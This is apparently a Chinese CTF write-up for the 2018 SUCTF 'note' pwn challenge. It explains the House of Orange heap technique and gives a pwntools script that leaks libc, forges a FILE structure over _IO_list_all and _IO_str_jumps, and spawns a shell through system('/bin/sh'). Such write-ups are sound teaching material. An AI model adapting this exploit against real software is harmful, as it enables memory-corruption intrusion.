---
title: 2018-SUCTF-note
date: 2019-04-01 19:31:07
tags:
---

## 0x00 总结

House of Orange的第一步是泄露libc的地址

我们可以从unsortedbin的chunk中获取。2014Hitcon那题是通过glibc释放了topchunk获取的libc地址，这题是题目自带了一个只能使用一次的free功能，让我们可以直接获取一个unsortedbin chunk，这样chunk的fd、bk中就泄露了libc的地址

第二步是可以溢出到unsortedbin chunk，修改bk，实现unsortedbin attack

## 0x01 使用House of Orange

```python
#/usr/bin/env python
from pwn import *
p = process(['/opt/glibc-2.24/lib/ld-linux-x86-64.so.2','--library-path','/opt/glibc-2.24/lib/','./note'])
elf = ELF('./note')
libc = ELF('/opt/glibc-2.24/lib/libc-2.24.so')

DEBUG = 0
VERBOSE = 1
if DEBUG:
	gdb.attach(p)
if VERBOSE:
	context(log_level = 'debug')

def q(s = ''):
	gdb.attach(p)
	if s != '':
		raw_input(s)
	
def add(length,content):
	p.recvuntil('Choice>>')
	p.sendline('1')
	p.recvuntil('Size:')
	p.sendline(str(length))
	p.recvuntil('Content:')
	p.sendline(content)

def show(idx):
	p.recvuntil('Choice>>')
        p.sendline('2')
	p.recvuntil('Index:')
	p.sendline(str(idx))
	
def box():
	p.recvuntil('Choice>>')
	p.sendline('3')
	p.recvuntil('(yes:1)')
	p.sendline('1')

def pwn():
	add(0x10,'2'*0x10)
	q()
	#leak address
	box()
	q()
	show(0)
	p.recvuntil('Content:')
	leak_addr = u64(p.recvuntil('\x0a')[:-1].ljust(8,'\x00'))
	libc_base = leak_addr - 0x398b00 - 88
	log.success('libc_base: '+hex(libc_base))
	_IO_list_all = libc_base + libc.symbols['_IO_list_all']
	log.success('_IO_list_all:' + hex(_IO_list_all))
	_IO_str_jumps = libc_base + libc.symbols['_IO_str_jumps']
	log.success('_IO_str_jumps: '+hex(_IO_str_jumps))
	system = libc_base + libc.symbols['system']
	log.success('system: '+hex(system))
	binsh = libc_base+libc.search('/bin/sh\x00').next()
	log.success('binsh: '+hex(binsh))

	payload = 'a'*0x10
	fake_file = p64(0)+p64(0x61)
	fake_file += p64(0)+p64(_IO_list_all - 0x10)
	fake_file += p64(0)+p64(1)
	fake_file += p64(0)
	fake_file += p64(binsh)
	fake_file = fake_file.ljust(0xc0,'\x00')
	fake_file += p64(0)
	fake_file += p64(0)*2
	fake_file += p64(_IO_str_jumps-0x8)
	fake_file = fake_file.ljust(0xe8,'\x00')
	payload += fake_file
	payload += p64(system)	
	add(0x10,payload)
	p.recvuntil('Choice>>')
  p.sendline('1')
  p.recvuntil('Size:')
  p.sendline(str(0x10))
	p.interactive()

if __name__ == '__main__':
	pwn()
```

## 0x02